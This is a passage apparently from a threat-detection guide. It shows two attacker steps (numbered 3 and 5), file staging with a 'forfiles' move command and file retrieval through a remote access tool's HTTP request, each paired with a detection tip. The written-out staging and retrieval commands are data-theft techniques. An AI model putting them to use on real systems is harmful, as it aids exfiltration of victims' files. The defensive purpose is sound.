3. **File Staging**
   - Application: Command Prompt
   - User Action: The attacker stages the collected files for exfiltration.
   - Key Artifacts: Command executed: `forfiles /p C:\Temp\StagedFiles /m *.docx /c "cmd /c move @file C:\Temp\StagedFiles\Staged\"`
   - Detection: Monitor for the use of `forfiles` to move files, especially in temporary directories.

5. **Use of Backdoors for Data Retrieval**
   - Application: Custom Remote Access Tool (RAT)
   - User Action: The attacker uses a backdoor to retrieve files from the compromised system.
   - Key Artifacts: Command executed by the RAT: `GET /files?path=C:\Temp\StagedFiles\`
   - Detection: Monitor for unusual outbound connections from known RATs or backdoor processes attempting to retrieve files.
